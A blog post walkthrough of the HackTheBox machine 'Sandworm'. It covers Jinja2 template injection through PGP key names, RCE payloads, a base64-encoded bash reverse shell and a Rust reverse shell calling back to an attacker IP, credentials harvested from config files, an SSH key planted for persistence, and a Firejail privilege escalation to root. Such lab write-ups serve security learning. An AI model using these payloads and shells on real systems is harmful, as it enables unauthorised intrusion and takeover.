---
layout: post
title: "HTB: Sandworm"
author: Andrew Cherney
date: 2023-11-18 10:28:35
tags: htb medium-box linux ssti gpg rust custom-code
icon: "assets/icons/sandworm.png"
post_description: "Sandworm's https site is meant to emulate a secure message transferring site, modelled after some over government sites. Getting past that uses a script I made to exploit SSTI. Through some config sifting and code manipulation you can gain user, and to finish it off a vulnerable service to obtain root."
---

<h1>Summary</h1>

{{ page.post_description }}

<h1>Enumeration</h1>

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Sandworm]
└──╼ $nmap -sC 10.10.11.218
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-06 18:41 CDT
Nmap scan report for 10.10.11.218
Host is up (0.053s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
| ssh-hostkey: 
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp  open  http
|_http-title: Did not follow redirect to https://ssa.htb/
443/tcp open  https
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Not valid before: 2023-05-04T18:03:25
|_Not valid after:  2050-09-19T18:03:25
|_http-title: Secret Spy Agency | Secret Security Service
```


<h2>Port 80 - http</h2>

{% include img_link src="/img/sandworm/sandworm_front_page" alt="front_page" ext="png" trunc=600 %}

{% include img_link src="/img/sandworm/sandworm_about_page" alt="front_page" ext="png" trunc=600 %}

![Contact info](/img/sandworm/sandworm_contact.png)


{% include img_link src="/img/sandworm/sandworm_pgp_guide" alt="front_page" ext="png" trunc=600 %}

At first glance this might appear to be some secure message sending service to a mock government agency. But that "Powered by Flask" footnote cannot escape my gaze. Secondly there is a key testing page at **ssa[.]htb/guide** which can be used to reflect back the name associated with a key. These two independently might mean little but together it means this site is likely vulnerable to SSTI. 

<h1>Foothold as atlas part 1</h1>

<h2>SSTI</h2>

The payload is simple, use an online site like [https://pgptool.org/](https://pgptool.org/) to generate a keypair and sign a message with the name being {% raw %} {{7*7}} {% endraw %} then check output.

![SSTI test payload](/img/sandworm/sandworm_ssti_test.png)

Excellent, now after confirming SSTI I can sift through Python modules available within the templating engine given I know this is Flask using Jinja2 to render templates. 

The basic format here is that everything in Python is an object, and as such if I take a string and get its class it would be a string, then its base class: an object, then if I get all object subclasses I can see all classes which inherit the object base class. With that info I can see many potential candidates to allow me to use the os module which gives me RCE.

![ssti subclasses](/img/sandworm/sandworm_ssti_subclasses.png)

A common place to use os and sys is warnings.catch_warnings, but after some testing the first payload below doesn't work. That's when I reference PwnFunction's video for a simple cheat payload using url_for which is used to reference internal pages and also contains os/sys.  



{% raw %}
```
{{ ''.__class__.__base__.__subclasses__()[145].__init__.globals__['sys'].modules['os'].popen('id').read() }}

{{ url_for.__globals__.os.popen('id').read() }}
```

```
Signature is valid! [GNUPG:] NEWSIG gpg: Signature made Tue 08 Aug 2023 10:21:57 AM UTC gpg: using RSA key 6D7FFBA7E995E640 [GNUPG:] KEY_CONSIDERED E0E8FC2DA894A3E1C72E4460604932423F0008AB 0 [GNUPG:] SIG_ID fOYPeFQv/V9nsgA+F0FP6Xqalio 2023-08-08 1691490117 [GNUPG:] KEY_CONSIDERED E0E8FC2DA894A3E1C72E4460604932423F0008AB 0 [GNUPG:] GOODSIG 6D7FFBA7E995E640 uid=1000(atlas) gid=1000(atlas) groups=1000(atlas) gpg: Good signature from "uid=1000(atlas) gid=1000(atlas) groups=1000(atlas) " [unknown] [GNUPG:] VALIDSIG 341421C2902032DF996A24416D7FFBA7E995E640 2023-08-08 1691490117 0 4 0 1 10 00 E0E8FC2DA894A3E1C72E4460604932423F0008AB [GNUPG:] KEY_CONSIDERED E0E8FC2DA894A3E1C72E4460604932423F0008AB 0 [GNUPG:] TRUST_UNDEFINED 0 pgp gpg: WARNING: This key is not certified with a trusted signature! gpg: There is no indication that the signature belongs to the owner. Primary key fingerprint: E0E8 FC2D A894 A3E1 C72E 4460 6049 3242 3F00 08AB Subkey fingerprint: 3414 21C2 9020 32DF 996A 2441 6D7F FBA7 E995 E640
```
{% endraw %}


Here I could have gotten a shell but I decided to overcomplicate a tad. You see there is a one command shell that I will run later leveraging base64 encoding to bypass **<>** restrictions in pgp names. Instead of that however I created a tool to give me a mock shell to examine this machine through the commands I send in the template. 

<h2>pgpsstiexploit.py</h2>

[The finished exploit.](https://github.com/CyberCherney/random_scripts/blob/main/hacking/htb_exploits/pgpsstiexploit.py)

In short this automates keygen, pgp key cleaning, message signing, and payload sending and I use it to scan around for hours before deciding I could have completely subverted this process and gotten shell long ago. 

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Sandworm]
└──╼ $python3 sandworm_pgpsigner.py 
PGP Signed Message Automator.
Made by CyberCherney

Do you want to delete all pgp keys in the directory
Yes/N: Yes
Cleaning up keys
Done cleaning up keys
> id
Generating key
Signing message with keyid BE8F626EB0E489C5
<a>
gpg: Good signature from "uid=1000(atlas) gid=1000(atlas) groups=1000(atlas)
 </a>
> echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Lzc3NzcgMD4mMQo=" | base64 -d | bash
Generating key
Signing message with keyid E1B913C8B14A7574
Something went wrong, the response was not as expected.
```

<h1>User as silentobserver</h1>

<h2>.config goodies</h2>

Two things stand out as odd here, first is that this shell I have is read-only, probably through firejail running on this machine which we can see in **.config** and the second oddity is httpie in the same .config file within the atlas home directory. 

That httpie directory has a session file with a hard coded password in it for silentobserver

```
atlas@sandworm:~$ ls -al /atlas/home/.config/httpie/sessions/localhost_5000
total 12
drwxrwx--- 2 nobody atlas 4096 May  4 17:30 .
drwxrwxr-x 3 nobody atlas 4096 Jan 15  2023 ..
-rw-r--r-- 1 nobody atlas  611 May  4 17:26 admin.json
atlas@sandworm:~$ cat .config/*/*/*/*
cat .config/*/*/*/*
{
    "__meta__": {
        "about": "HTTPie session file",
        "help": "https://httpie.io/docs#sessions",
        "httpie": "2.6.0"
    },
    "auth": {
        "password": "quietLiketheWind22",
        "type": null,
        "username": "silentobserver"
    },
    "cookies": {
        "session": {
            "expires": null,
            "path": "/",
            "secure": false,
            "value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"
        }
    },
    "headers": {
        "Accept": "application/json, */*;q=0.5"
    }
}
```

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Sandworm]
└──╼ $ssh silentobserver@ssa.htb
silentobserver@ssa.htb's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-73-generic x86_64)
...
silentobserver@sandworm:~$ cat user.txt
b87ebbb91de5--------------------
```

<h1>User as atlas part 2</h1>

<h2>pspy64</h2>

Time for the usual culprits of initial enumeration. When searching for processes I see tipnet being run with sudo. 

```
2023/08/23 01:06:01 CMD: UID=0     PID=1688   | /usr/sbin/CRON -f -P 
2023/08/23 01:06:01 CMD: UID=0     PID=1687   | /usr/sbin/CRON -f -P 
2023/08/23 01:06:01 CMD: UID=0     PID=1690   | sleep 10 
2023/08/23 01:06:01 CMD: UID=0     PID=1689   | /bin/sh -c sleep 10 && /root/Cleanup/clean_c.sh 
2023/08/23 01:06:01 CMD: UID=0     PID=1691   | /usr/sbin/CRON -f -P 
2023/08/23 01:06:01 CMD: UID=0     PID=1693   | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline 
2023/08/23 01:06:01 CMD: UID=0     PID=1692   | 
2023/08/23 01:06:01 CMD: UID=1000  PID=1694   | 
```

I checkout that directory and find some config files and an ELF called tipnet. In **tipnet.d** there is reference to two rust files, main and lib. 

```bash
silentobserver@sandworm:/opt/tipnet/target/debug$ file tipnet
tipnet: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4e08237e1850e444052477b020689e0d4a8dc567, for GNU/Linux 3.2.0, with debug_info, not stripped
silentobserver@sandworm:/opt/tipnet/target/debug$ ./tipnet
                                                     
             ,,                                      
MMP""MM""YMM db          `7MN.   `7MF'         mm    
P'   MM   `7               MMN.    M           MM    
     MM    `7MM `7MMpdMAo. M YMb   M  .gP"Ya mmMMmm  
     MM      MM   MM   `Wb M  `MN. M ,M'   Yb  MM    
     MM      MM   MM    M8 M   `MM.M 8M""""""  MM    
     MM      MM   MM   ,AP M     YMM YM.    ,  MM    
   .JMML.  .JMML. MMbmmd'.JML.    YM  `Mbmmd'  `Mbmo 
                  MM                                 
                .JMML.                               


Select mode of usage:
a) Upstream 
b) Regular (WIP)
c) Emperor (WIP)
d) SQUARE (WIP)
e) Refresh Indeces
a

[+] Upstream selected
Enter keywords to perform the query:
asd
Justification for the search:
asd
silentobserver@sandworm:/opt/tipnet/target/debug$ cat tipnet.d
/opt/tipnet/target/debug/tipnet: /opt/crates/logger/src/lib.rs /opt/tipnet/src/main.rs
```

In main I find some hard coded credentials for the mysql server

```
fn connect_to_db(db: &str) -> Result<mysql::PooledConn> {
    let url = "mysql://tipnet:4The_Greater_GoodJ4A@localhost:3306/Upstream";
    let pool = Pool::new(url).unwrap();
    let mut conn = pool.get_conn().unwrap();
    return Ok(conn);
}
```

<h2>Shell with Rust</h2>

the **lib.rs** file is writable by me, which means whenever tipnet is run and initialized the lib file I can gain a shell. To do that with rust:

```rust
use std::process::Command;
let output = Command::new("bash")
		.arg("-c")
		.arg("bash -i >& /dev/tcp/10.10.14.2/7777 0>&1")
		.output()
		.expect("failed to execute process");
```

And as is customary I generate a keypair to ssh in with for ease of access. 

```
atlas@sandworm:~$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDlisIl4VziLK6zprV5KvPkSDXZrtIq8gudPiKthYprvC6XNyvLTw2+M+H2ezMsQU+xnyA0u5TlsEkjitMnBfuxGgNUHhqkC3WiTapNVV02PUO/XJQP/MUL2hchkqLOH4TIkCu5GUOEE3CS+pcx1I29558ml8vrkU+iMTWOpPcbdfIIiMSr+kJEtQJ0XIrPzJtD0sC65g8FRskPWP1ZDLNEQQVmQ1ay9l4ZKID0+i8yJVLeH0WlERkyulyq3p3qPcS5v5LIAN7unoizpCBLOmvwBan2YfmYeuTAgPuwA4nGXsBJnEkqvDh+o1ozXNUalOMTYynFx/qebwn608yWQ+lgn1Tro5pCQoINVZAeexA3bx1GW/CPluwht4EIDcXbjkrVtK0+En8mhNeQ7j80Nci2fZq94OYglFUtVazo8e/Rfp43se7FvInWc0nZHBVIWixCBIzuBzztWim+BTslMZObfxEuejxZTzcb4ohJjAoVovKBLD9BQvMv9AflI5urbp8= raccoon@cyberraccoon-virtualbox" > .ssh/authorized_keys
<oon@cyberraccoon-virtualbox" > .ssh/authorized_keys
```

<h1>Root</h1>

<h2>firejail</h2>

```
atlas@sandworm:~$ find / -perm /4000 2>/dev/null
/opt/tipnet/target/debug/tipnet
/opt/tipnet/target/debug/deps/tipnet-a859bd054535b3c1
/opt/tipnet/target/debug/deps/tipnet-dabc93f7704f7b48
/usr/local/bin/firejail
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/usr/bin/mount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/su
/usr/bin/fusermount3
```

This took a long while to find the original source but searching for a firejail priv esc exploit yields someone who has also solved sandworm and placed the script on their github. That script however is originally from [this Openwall post by Mathias Gerstner](https://www.openwall.com/lists/oss-security/2022/06/08/10). [The python exploit is here](https://www.openwall.com/lists/oss-security/2022/06/08/10/1) which leverages utilizing fake symlinks to create fake Firejail processes allowing for a user controlled namespace that can run setuid-root programs within the newly mounted namespace. 

```bash
atlas@sandworm:~$ chmod +x exploit.py 
atlas@sandworm:~$ python3 exploit.py 
You can now run 'firejail --join=3097' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Sandworm]
└──╼ $ssh atlas@ssa.htb -i sandworm_key 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-73-generic x86_64)
...
Last login: Wed Aug 23 01:41:33 2023 from 10.10.14.2
atlas@sandworm:~$ firejail --join=3097
changing root to /proc/3097/root
Warning: cleaning all supplementary groups
Child process initialized in 9.39 ms
atlas@sandworm:~$ sudo su -
atlas is not in the sudoers file.  This incident will be reported.
atlas@sandworm:~$ su -
root@sandworm:~# cat /root/root.txt
88e5544bac69--------------------
```

